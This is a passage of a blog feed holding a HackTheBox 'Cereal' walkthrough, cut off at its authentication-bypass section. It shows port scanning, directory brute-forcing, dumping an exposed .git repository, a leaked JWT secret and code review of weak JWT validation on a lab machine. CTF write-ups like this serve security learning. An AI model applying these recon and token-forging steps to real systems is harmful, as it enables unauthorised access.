 <li><a href="https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/">https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/</a></li>
 <li><a href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>HackTheBox - Cereal (User only)</title>
+      <link>https://fahmifj.github.io/hackthebox/cereal/</link>
+      <pubDate>Wed, 09 Jun 2021 07:33:40 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/hackthebox/cereal/</guid>
+      <description>Doing code reviews in order to chain XSS, SSRF, and deserialization vulnerabilities to get RCE</description>
+      <content:encoded><![CDATA[<p>Cereal is a hard difficulty Windows machine that features a misconfigured web server, which exposes source code of the currently hosted web application. Initial source code analysis revealed a deleted JWT secret that could be used to forge a JWT token and bypass the application&rsquo;s login page. Another code analysis finds the web is vulnerable to a deserialization attack. There is also an XSS vulnerability in one of the packages used by the application. Chaining these vulnerabilities results in a shell access to the system.</p>
+<h4 id="skills-learned">Skills Learned</h4>
+<ul>
+<li>Code review</li>
+<li>JWT authentication bypass</li>
+<li>XSS exploitation</li>
+<li>.NET deserialization</li>
+<li>Exploit chain</li>
+</ul>
+<h4 id="tools">Tools</h4>
+<ul>
+<li>Kali Linux 2019.4 (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
+<li>Nmap - Preinstalled in Kali Linux</li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p>All TCP ports scan with <code>nmap</code> discovers three open ports: SSH on port 22, HTTP on port 80, and HTTP on port 443.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
+$ nmap -p- --min-rate <span class="m">1000</span> --reason -oA nmap/10-tcp-allport-cereal 10.10.10.217
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-04 23:45 EDT
+
+...&lt;SNIP&gt;...
+PORT    STATE SERVICE REASON
+22/tcp  open  ssh     syn-ack ttl <span class="m">127</span>
+80/tcp  open  http    syn-ack ttl <span class="m">127</span>
+443/tcp open  https   syn-ack ttl <span class="m">127</span>
+
+Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 118.08 seconds
+</code></pre></div><p>I&rsquo;ll run another scan with <code>nmap</code> &rsquo;s default scripts.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
+$ nmap -p 22,80,443 -sC -sV -oA nmap/10-tcp-allport-script 10.10.10.217
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-04 23:51 EDT
+
+...&lt;SNIP&gt;...
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH for_Windows_7.7 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+<span class="p">|</span> ssh-hostkey: 
+<span class="p">|</span>   <span class="m">2048</span> 08:8e:fe:04:8c:ad:6f:df:88:c7:f3:9a:c5:da:6d:ac <span class="o">(</span>RSA<span class="o">)</span>
+<span class="p">|</span>   <span class="m">256</span> fb:f5:7b:a1:68:07:c0:7b:73:d2:ad:33:df:0a:fc:ac <span class="o">(</span>ECDSA<span class="o">)</span>
+<span class="p">|</span>_  <span class="m">256</span> cc:0e:70:ec:33:42:59:78:31:c0:4e:c2:a5:c9:0e:1e <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp  open  http     Microsoft IIS httpd 10.0
+<span class="p">|</span>_http-server-header: Microsoft-IIS/10.0
+<span class="p">|</span>_http-title: Did not follow redirect to https://cereal.htb/
+<span class="p">|</span>_https-redirect: ERROR: Script execution failed <span class="o">(</span>use -d to debug<span class="o">)</span>
+443/tcp open  ssl/http Microsoft IIS httpd 10.0
+<span class="p">|</span>_http-server-header: Microsoft-IIS/10.0
+<span class="p">|</span>_http-title: Cereal
+<span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>cereal.htb
+<span class="p">|</span> Subject Alternative Name: DNS:cereal.htb, DNS:source.cereal.htb
+<span class="p">|</span> Not valid before: 2020-11-11T19:57:18
+<span class="p">|</span>_Not valid after:  2040-11-11T20:07:19
+<span class="p">|</span>_ssl-date: 2021-06-05T03:51:48+00:00<span class="p">;</span> +5s from scanner time.
+<span class="p">|</span> tls-alpn: 
+<span class="p">|</span>_  http/1.1
+Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+<span class="p">|</span>_clock-skew: 4s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 23.34 seconds
+</code></pre></div><p>This time <code>nmap</code> found two hostnames from the SSL certificate: <code>cereal.htb</code> and <code>source.cereal.htb</code>.</p>
+<p>I&rsquo;ll add those hostnames to my <code>/etc/hosts</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
+$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.217 cereal.htb source.cereal.htb&#39;</span> &gt;&gt; /etc/hosts
+</code></pre></div><h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80">TCP 80</h3>
+<p>It redirects to the HTTPS.</p>
+<h3 id="tcp-443---cerealhtb">TCP 443 - cereal.htb</h3>
+<p>Following the redirection ends up at a login form. I tried a few common credentials, but they didn&rsquo;t work here.</p>
+<p><div class="img-container"><img src="imgs/image-20210605110703967.png" alt="image-20210605110703967"  /></div>
+</p>
+<p>Inspecting the source reveals that this site is a react based application.</p>
+<p><div class="img-container"><img src="imgs/image-20210609080804206.png" alt="image-20210609080804206"  /></div>
+</p>
+<p>If I track down the authentication process, this site store the authentication data in browser&rsquo;s local storage with a key name of <code>currentUser</code>, but l&rsquo;ll leave it for now.</p>
+<p><div class="img-container"><img src="imgs/image-20210609082429730.png" alt="image-20210609082429730"  /></div>
+</p>
+<p>I also did a gobuster scan, but didn&rsquo;t find anything useful.</p>
+<h3 id="tcp-443---sourcecerealhtb">TCP 443 - source.cereal.htb</h3>
+<p>Visiting <code>source.cereal.htb</code> shows a server error message of an ASP.net application:</p>
+<p><div class="img-container"><img src="imgs/image-20210605111410148.png" alt="image-20210605111410148"  /></div>
+</p>
+<p>Nothing I can do with this page, but I&rsquo;ll take note on the leaked file path:</p>
+<ul>
+<li><code>C:\inetpub\source\default.aspx</code></li>
+</ul>
+<h4 id="gobuster">Gobuster</h4>
+<p><code>gobuster</code> scan discovers a git repository, and there is also an upload directory.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
+$ gobuster dir -u https://source.cereal.htb -k -w /opt/SecLists/Discovery/Web-Content/common.txt -x aspx,txt
+<span class="o">===============================================================</span>
+Gobuster v3.1.0
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+<span class="o">]</span> Url:                     https://source.cereal.htb
+<span class="o">[</span>+<span class="o">]</span> Method:                  GET
+<span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
+<span class="o">[</span>+<span class="o">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/common.txt
+<span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
+<span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
+<span class="o">[</span>+<span class="o">]</span> Extensions:              aspx,txt
+<span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
+<span class="o">===============================================================</span>
+2021/06/05 00:52:32 Starting gobuster in directory enumeration <span class="nv">mode</span>
+<span class="o">===============================================================</span>
+/.git/HEAD            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 23<span class="o">]</span>
+/Default.aspx         <span class="o">(</span>Status: 500<span class="o">)</span> <span class="o">[</span>Size: 10090<span class="o">]</span>
+/aspnet_client        <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 163<span class="o">]</span> <span class="o">[</span>--&gt; https://source.cereal.htb/aspnet_client/<span class="o">]</span>
+/default.aspx         <span class="o">(</span>Status: 500<span class="o">)</span> <span class="o">[</span>Size: 9727<span class="o">]</span>                                              
+/uploads              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 157<span class="o">]</span> <span class="o">[</span>--&gt; https://source.cereal.htb/uploads/<span class="o">]</span>      
+                                                                                              
+<span class="o">===============================================================</span>
+2021/06/05 00:54:41 <span class="nv">Finished</span>
+<span class="o">===============================================================</span>
+</code></pre></div><p>Access to the <code>.git</code> and the <code>uploads</code> directory are forbidden.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
+$ curl -I -k http://source.cereal.htb/.git/ <span class="o">&amp;&amp;</span> curl -I -k http://source.cereal.htb/uploads/
+HTTP/1.1 <span class="m">403</span> Forbidden
+Content-Length: <span class="m">1233</span>
+Content-Type: text/html
+Server: Microsoft-IIS/10.0
+X-Powered-By: Sugar
+Date: Sat, <span class="m">05</span> Jun <span class="m">2021</span> 05:01:25 GMT
+
+HTTP/1.1 <span class="m">403</span> Forbidden
+Content-Length: <span class="m">1233</span>
+Content-Type: text/html
+Server: Microsoft-IIS/10.0
+X-Powered-By: Sugar
+Date: Sat, <span class="m">05</span> Jun <span class="m">2021</span> 05:08:16 GMT
+</code></pre></div><p>But requesting files under <code>.git</code> directory are allowed.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
+$ curl -I -k http://source.cereal.htb/.git/HEAD
+HTTP/1.1 <span class="m">200</span> OK
+Content-Length: <span class="m">23</span>
+Content-Type: text/plain
+Last-Modified: Wed, <span class="m">11</span> Nov <span class="m">2020</span> 20:09:34 GMT
+Accept-Ranges: bytes
+ETag: <span class="s2">&#34;adc1d19266b8d61:0&#34;</span>
+Server: Microsoft-IIS/10.0
+X-Powered-By: Sugar
+Date: Sat, <span class="m">05</span> Jun <span class="m">2021</span> 05:01:29 GMT
+
+→ root@kali «cereal» «10.10.14.3» 
+$ curl -s -k http://source.cereal.htb/.git/HEAD
+ref: refs/heads/master
+</code></pre></div><p>I&rsquo;ll note the <code>uploads</code> directory.</p>
+<h3 id="git">Git</h3>
+<h4 id="dumping-git-directory">Dumping .git directory</h4>
+<p>With <a href="https://github.com/arthaud/git-dumper">git-dumper</a>, I could get all the files in that <code>.git</code> directory.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
+$ mkdir loot/source-cereal-git <span class="o">&amp;&amp;</span> ./git-dumper.py https://source.cereal.htb/.git loot/source-cereal-git 
+<span class="o">[</span>-<span class="o">]</span> Testing https://source.cereal.htb/.git/HEAD <span class="o">[</span>200<span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span> Testing https://source.cereal.htb/.git/ <span class="o">[</span>403<span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span> Fetching common files
+<span class="o">[</span>-<span class="o">]</span> Fetching https://source.cereal.htb/.gitignore <span class="o">[</span>404<span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span> Fetching https://source.cereal.htb/.git/hooks/applypatch-msg.sample <span class="o">[</span>404<span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span> Fetching https://source.cereal.htb/.git/COMMIT_EDITMSG <span class="o">[</span>200<span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span> Fetching https://source.cereal.htb/.git/description <span class="o">[</span>200<span class="o">]</span>
+...&lt;SNIP&gt;...
+<span class="o">[</span>-<span class="o">]</span> Finding refs/
+<span class="o">[</span>-<span class="o">]</span> Fetching https://source.cereal.htb/.git/ORIG_HEAD <span class="o">[</span>404<span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span> Fetching https://source.cereal.htb/.git/config <span class="o">[</span>200<span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span> Fetching https://source.cereal.htb/.git/FETCH_HEAD <span class="o">[</span>404<span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span> Fetching https://source.cereal.htb/.git/HEAD <span class="o">[</span>200<span class="o">]</span>
+...&lt;SNIP&gt;...
+<span class="o">[</span>-<span class="o">]</span> Finding packs
+<span class="o">[</span>-<span class="o">]</span> Finding objects
+<span class="o">[</span>-<span class="o">]</span> Fetching objects
+<span class="o">[</span>-<span class="o">]</span> Fetching https://source.cereal.htb/.git/objects/8f/2a1a88f15b9109e1f63e4e4551727bfb38eee5 <span class="o">[</span>200<span class="o">]</span>
+...&lt;SNIP&gt;...
+<span class="o">[</span>-<span class="o">]</span> Running git checkout .
+</code></pre></div><h4 id="git-history">Git History</h4>
+<p>I could see the history of this repository by issuing <code>git log</code>.</p>
+<p><div class="img-container"><img src="imgs/image-20210605121727689.png" alt="image-20210605121727689"  /></div>
+</p>
+<p>Aside from the author&rsquo;s names, one commit with the message &ldquo;Security fixes&rdquo; caught my attention.</p>
+<p>I immediately run <code>git diff 8f2a 7bd9</code> to compare the first commit with the security fixes and that reveals a deleted JWT secret.</p>
+<p><div class="img-container"><img src="imgs/image-20210609090452619.png" alt="image-20210609090452619"  /></div>
+</p>
+<p>It looks like the security fixes include prevention against deserialization attacks which I&rsquo;ll note that as well as the secret:</p>
+<ul>
+<li>JWT secret: <code>secretlhfIH&amp;FY*#oysuflkhskjfhefesf</code></li>
+</ul>
+<h3 id="source-code-analysis-1">Source Code Analysis #1</h3>
+<blockquote>
+<p>I pointed my sh*tty explanation or at least how I understand it with <code>// &lt;==</code> or  <code># &lt;==</code> in the code snippet. Please, don&rsquo;t bully me for this.</p>
+</blockquote>
+<h4 id="app-overview">App Overview</h4>
+<p>The app consist of ASP.NET (back-end)  and React (front-end).</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «source-cereal-git» «10.10.14.3» git:<span class="o">(</span>master<span class="o">)</span> 
+$ tree -L <span class="m">1</span> --dirsfirst
+.
+├── ClientApp
+├── Controllers
+├── Migrations
+├── Models
+├── Pages
+├── Properties
+├── Services
+├── ApplicationOptions.cs
+├── appsettings.Development.json
+├── appsettings.json
+├── CerealContext.cs
+├── Cereal.csproj
+├── DownloadHelper.cs
+├── ExtensionMethods.cs
+├── IPAddressHandler.cs
+├── IPRequirement.cs
+├── Program.cs
+└── Startup.cs
+</code></pre></div><p>The source code of previously seen React app at <code>cereal.htb</code> is on the ClientApp folder.</p>
+<p>Here is the overview of app execution flow:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">Program.cs
+ |
+ v
+Startup.cs  -&gt; Loads appsettings.json
+ |
+ v
+React client
+</code></pre></div><p>Looking into the <code>appsettings.js</code>, I could obtain the following information:</p>
+<ul>
+<li>There is IP whitelist</li>
+<li>There are two rules that looks like limiting requests and it&rsquo;ll reset after certain period. One of them is limiting a post request to an endpoint called <code>/requests</code>.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span>
+<span class="err">...&lt;SNIP&gt;...</span>
+  <span class="nt">&#34;AllowedHosts&#34;</span><span class="p">:</span> <span class="s2">&#34;*&#34;</span><span class="p">,</span>
+  <span class="nt">&#34;ApplicationOptions&#34;</span><span class="p">:</span> <span class="p">{</span>
+    <span class="nt">&#34;Whitelist&#34;</span><span class="p">:</span> <span class="p">[</span> <span class="s2">&#34;127.0.0.1&#34;</span><span class="p">,</span> <span class="s2">&#34;::1&#34;</span> <span class="p">]</span>
+  <span class="p">},</span>
+  <span class="nt">&#34;IpRateLimiting&#34;</span><span class="p">:</span> <span class="p">{</span>
+    <span class="nt">&#34;EnableEndpointRateLimiting&#34;</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
+    <span class="nt">&#34;StackBlockedRequests&#34;</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+    <span class="nt">&#34;RealIpHeader&#34;</span><span class="p">:</span> <span class="s2">&#34;X-Real-IP&#34;</span><span class="p">,</span>
+    <span class="nt">&#34;ClientIdHeader&#34;</span><span class="p">:</span> <span class="s2">&#34;X-ClientId&#34;</span><span class="p">,</span>
+    <span class="nt">&#34;HttpStatusCode&#34;</span><span class="p">:</span> <span class="mi">429</span><span class="p">,</span>
+    <span class="nt">&#34;IpWhitelist&#34;</span><span class="p">:</span> <span class="p">[</span> <span class="s2">&#34;127.0.0.1&#34;</span><span class="p">,</span> <span class="s2">&#34;::1&#34;</span> <span class="p">],</span>
+    <span class="nt">&#34;EndpointWhitelist&#34;</span><span class="p">:</span> <span class="p">[],</span>
+    <span class="nt">&#34;ClientWhitelist&#34;</span><span class="p">:</span> <span class="p">[],</span>
+    <span class="nt">&#34;GeneralRules&#34;</span><span class="p">:</span> <span class="p">[</span>
+      <span class="p">{</span>
+        <span class="nt">&#34;Endpoint&#34;</span><span class="p">:</span> <span class="s2">&#34;post:/requests&#34;</span><span class="p">,</span>
+        <span class="nt">&#34;Period&#34;</span><span class="p">:</span> <span class="s2">&#34;5m&#34;</span><span class="p">,</span>
+        <span class="nt">&#34;Limit&#34;</span><span class="p">:</span> <span class="mi">2</span>
+      <span class="p">},</span>
+      <span class="p">{</span>
+        <span class="nt">&#34;Endpoint&#34;</span><span class="p">:</span> <span class="s2">&#34;*&#34;</span><span class="p">,</span>
+        <span class="nt">&#34;Period&#34;</span><span class="p">:</span> <span class="s2">&#34;5m&#34;</span><span class="p">,</span>
+        <span class="nt">&#34;Limit&#34;</span><span class="p">:</span> <span class="mi">150</span>
+      <span class="p">}</span>
+    <span class="p">]</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+
+</code></pre></div><h4 id="authentication-vulnerability">Authentication Vulnerability</h4>
+<p>Looking into the <code>Startup.cs</code> file, I could see there is a potential authentication bypass. On the following code snippet, the application clearly doesn&rsquo;t validate the issuer and the audience of a JWT token, and <a href="https://curity.io/resources/learn/jwt-best-practices/#4-always-check-the-issuer">this can raise a security issue</a>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="p">...&lt;</span><span class="n">SNIP</span><span class="p">&gt;...</span>
+    <span class="kt">var</span> <span class="n">key</span> <span class="p">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="s">&#34;*&#34;</span><span class="p">);</span>
+    <span class="n">services</span><span class="p">.</span><span class="n">AddAuthentication</span><span class="p">(</span><span class="n">x</span> <span class="p">=&gt;</span>
+    <span class="p">{</span>
+        <span class="n">x</span><span class="p">.</span><span class="n">DefaultAuthenticateScheme</span> <span class="p">=</span> <span class="n">JwtBearerDefaults</span><span class="p">.</span><span class="n">AuthenticationScheme</span><span class="p">;</span>
+        <span class="n">x</span><span class="p">.</span><span class="n">DefaultChallengeScheme</span> <span class="p">=</span> <span class="n">JwtBearerDefaults</span><span class="p">.</span><span class="n">AuthenticationScheme</span><span class="p">;</span>
+    <span class="p">})</span>
+    <span class="p">.</span><span class="n">AddJwtBearer</span><span class="p">(</span><span class="n">x</span> <span class="p">=&gt;</span>
+    <span class="p">{</span>
+        <span class="n">x</span><span class="p">.</span><span class="n">RequireHttpsMetadata</span> <span class="p">=</span> <span class="k">false</span><span class="p">;</span>
+        <span class="n">x</span><span class="p">.</span><span class="n">SaveToken</span> <span class="p">=</span> <span class="k">true</span><span class="p">;</span>
+        <span class="n">x</span><span class="p">.</span><span class="n">TokenValidationParameters</span> <span class="p">=</span> <span class="k">new</span> <span class="n">TokenValidationParameters</span>
+        <span class="p">{</span>
+            <span class="n">ValidateIssuerSigningKey</span> <span class="p">=</span> <span class="k">true</span><span class="p">,</span>
+            <span class="n">IssuerSigningKey</span> <span class="p">=</span> <span class="k">new</span> <span class="n">SymmetricSecurityKey</span><span class="p">(</span><span class="n">key</span><span class="p">),</span>
+            <span class="n">ValidateIssuer</span> <span class="p">=</span> <span class="k">false</span><span class="p">,</span> <span class="c1">// &lt;== No validation
+</span><span class="c1"></span>            <span class="n">ValidateAudience</span> <span class="p">=</span> <span class="k">false</span> <span class="c1">// &lt;== No validation
+</span><span class="c1"></span>        <span class="p">};</span>
+    <span class="p">});</span>
+<span class="p">...&lt;</span><span class="n">SNIP</span><span class="p">&gt;...</span>
+</code></pre></div><p>The JWT token itself is forged at <code>Services/UserService.cs</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="k">public</span> <span class="n">User</span> <span class="n">Authenticate</span><span class="p">(</span><span class="kt">string</span> <span class="n">username</span><span class="p">,</span> <span class="kt">string</span> <span class="n">password</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="k">using</span> <span class="p">(</span><span class="kt">var</span> <span class="n">db</span> <span class="p">=</span> <span class="k">new</span> <span class="n">CerealContext</span><span class="p">())</span>
+            <span class="p">{</span>
+                <span class="kt">var</span> <span class="n">user</span> <span class="p">=</span> <span class="n">db</span><span class="p">.</span><span class="n">Users</span><span class="p">.</span><span class="n">Where</span><span class="p">(</span><span class="n">x</span> <span class="p">=&gt;</span> <span class="n">x</span><span class="p">.</span><span class="n">Username</span> <span class="p">==</span> <span class="n">username</span> <span class="p">&amp;&amp;</span> <span class="n">x</span><span class="p">.</span><span class="n">Password</span> <span class="p">==</span> <span class="n">password</span><span class="p">).</span><span class="n">SingleOrDefault</span><span class="p">();</span>
+
+                <span class="c1">// return null if user not found
+</span><span class="c1"></span>                <span class="k">if</span> <span class="p">(</span><span class="n">user</span> <span class="p">==</span> <span class="k">null</span><span class="p">)</span>
+                    <span class="k">return</span> <span class="k">null</span><span class="p">;</span>
+
+                <span class="c1">// authentication successful so generate jwt token
+</span><span class="c1"></span>                <span class="kt">var</span> <span class="n">tokenHandler</span> <span class="p">=</span> <span class="k">new</span> <span class="n">JwtSecurityTokenHandler</span><span class="p">();</span>
+                <span class="kt">var</span> <span class="n">key</span> <span class="p">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="s">&#34;*&#34;</span><span class="p">);</span>
+                <span class="kt">var</span> <span class="n">tokenDescriptor</span> <span class="p">=</span> <span class="k">new</span> <span class="n">SecurityTokenDescriptor</span>
+                <span class="p">{</span>
+                    <span class="n">Subject</span> <span class="p">=</span> <span class="k">new</span> <span class="n">ClaimsIdentity</span><span class="p">(</span><span class="k">new</span> <span class="n">Claim</span><span class="p">[]</span>
+                    <span class="p">{</span>
+                        <span class="k">new</span> <span class="n">Claim</span><span class="p">(</span><span class="n">ClaimTypes</span><span class="p">.</span><span class="n">Name</span><span class="p">,</span> <span class="n">user</span><span class="p">.</span><span class="n">UserId</span><span class="p">.</span><span class="n">ToString</span><span class="p">())</span>
+                    <span class="p">}),</span>
+                    <span class="n">Expires</span> <span class="p">=</span> <span class="n">DateTime</span><span class="p">.</span><span class="n">UtcNow</span><span class="p">.</span><span class="n">AddDays</span><span class="p">(</span><span class="m">7</span><span class="p">),</span>
+                    <span class="n">SigningCredentials</span> <span class="p">=</span> <span class="k">new</span> <span class="n">SigningCredentials</span><span class="p">(</span><span class="k">new</span> <span class="n">SymmetricSecurityKey</span><span class="p">(</span><span class="n">key</span><span class="p">),</span> <span class="n">SecurityAlgorithms</span><span class="p">.</span><span class="n">HmacSha256Signature</span><span class="p">)</span>
+                <span class="p">};</span>
+                <span class="kt">var</span> <span class="n">token</span> <span class="p">=</span> <span class="n">tokenHandler</span><span class="p">.</span><span class="n">CreateToken</span><span class="p">(</span><span class="n">tokenDescriptor</span><span class="p">);</span>
+                <span class="n">user</span><span class="p">.</span><span class="n">Token</span> <span class="p">=</span> <span class="n">tokenHandler</span><span class="p">.</span><span class="n">WriteToken</span><span class="p">(</span><span class="n">token</span><span class="p">);</span>
+
+                <span class="k">return</span> <span class="n">user</span><span class="p">.</span><span class="n">WithoutPassword</span><span class="p">();</span>
+            <span class="p">}</span>
+</code></pre></div><p>When the user attempts to authenticate, the code snippet above checks to see if the user&rsquo;s credentials match those in the database. If the credentials match, the app will generate a JWT token for that user.</p>
+<p>The user model is defined in here <code>Models/User.cs</code>. From here, I can assume each JWT token contains at least a user&rsquo;s ID, expiration time (7 days), username, and token.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="p">...&lt;</span><span class="n">SNIP</span><span class="p">&gt;...</span>
+    <span class="k">public</span> <span class="k">class</span> <span class="nc">User</span>
+    <span class="p">{</span>
+<span class="na">        [Key]</span>
+        <span class="k">public</span> <span class="kt">int</span> <span class="n">UserId</span> <span class="p">{</span> <span class="k">get</span><span class="p">;</span> <span class="k">set</span><span class="p">;</span> <span class="p">}</span>
+<span class="na">        [Required]</span>
+        <span class="k">public</span> <span class="kt">string</span> <span class="n">Username</span> <span class="p">{</span> <span class="k">get</span><span class="p">;</span> <span class="k">set</span><span class="p">;</span> <span class="p">}</span>
+<span class="na">        [Required]</span>
+        <span class="k">public</span> <span class="kt">string</span> <span class="n">Password</span> <span class="p">{</span> <span class="k">get</span><span class="p">;</span> <span class="k">set</span><span class="p">;</span> <span class="p">}</span>
+        <span class="k">public</span> <span class="kt">string</span> <span class="n">Token</span> <span class="p">{</span> <span class="k">get</span><span class="p">;</span> <span class="k">set</span><span class="p">;</span> <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">...&lt;</span><span class="n">SNIP</span><span class="p">&gt;...</span>
+</code></pre></div><p>Interestingly, in <code>ClientApp/src/LoginPage/LoginPage.jsx</code>, the authentication process doesn&rsquo;t look like it needs server/back-end validation, because it checks the browser&rsquo;s local storage first.</p>
+<blockquote>
+<p>It&rsquo;ll ask the server if we press the login button (POST request).</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="p">...</span><span class="o">&lt;</span><span class="nx">SNIP</span><span class="o">&gt;</span><span class="p">...</span>
+<span class="kr">import</span> <span class="p">{</span> <span class="nx">authenticationService</span> <span class="p">}</span> <span class="nx">from</span> <span class="s1">&#39;../_services&#39;</span><span class="p">;</span> <span class="c1">// &lt;==
+</span><span class="c1"></span>
+<span class="kr">class</span> <span class="nx">LoginPage</span> <span class="kr">extends</span> <span class="nx">React</span><span class="p">.</span><span class="nx">Component</span> <span class="p">{</span>
+    <span class="nx">constructor</span><span class="p">(</span><span class="nx">props</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kr">super</span><span class="p">(</span><span class="nx">props</span><span class="p">);</span>
+
+        <span class="c1">// redirect to home if already logged in
+</span><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="nx">authenticationService</span><span class="p">.</span><span class="nx">currentUserValue</span><span class="p">)</span> <span class="p">{</span>  <span class="c1">// &lt;==
+</span><span class="c1"></span>            <span class="k">this</span><span class="p">.</span><span class="nx">props</span><span class="p">.</span><span class="nx">history</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">);</span> 
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="nx">render</span><span class="p">()</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="p">(</span>
+            <span class="o">&lt;</span><span class="nx">div</span><span class="o">&gt;</span>
+                <span class="o">&lt;</span><span class="nx">h2</span><span class="o">&gt;</span><span class="nx">Login</span><span class="o">&lt;</span><span class="err">/h2&gt;</span>
+<span class="p">...</span><span class="o">&lt;</span><span class="nx">SNIP</span><span class="o">&gt;</span><span class="p">...</span>
+</code></pre></div><p>I could track the <code>authenticationService.currentUserValue</code> and it is defined in  <code>ClientApp/src/_services/authentication.service.jsx</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kr">const</span> <span class="nx">currentUserSubject</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BehaviorSubject</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">localStorage</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="s1">&#39;currentUser&#39;</span><span class="p">)));</span> <span class="c1">// &lt;==
+</span><span class="c1"></span>
+<span class="kr">export</span> <span class="kr">const</span> <span class="nx">authenticationService</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="nx">login</span><span class="p">,</span>
+    <span class="nx">logout</span><span class="p">,</span>
+    <span class="nx">currentUser</span><span class="o">:</span> <span class="nx">currentUserSubject</span><span class="p">.</span><span class="nx">asObservable</span><span class="p">(),</span><span class="c1">// &lt;==
+</span><span class="c1"></span>    <span class="nx">get</span> <span class="nx">currentUserValue</span> <span class="p">()</span> <span class="p">{</span> <span class="k">return</span> <span class="nx">currentUserSubject</span><span class="p">.</span><span class="nx">value</span> <span class="p">}</span> <span class="c1">// &lt;==
+</span><span class="c1"></span><span class="p">};</span>
+</code></pre></div><h3 id="authentication-bypass">Authentication Bypass</h3>
+<p>I could summarize the previous code analysis to these points:</p>
+<ul>
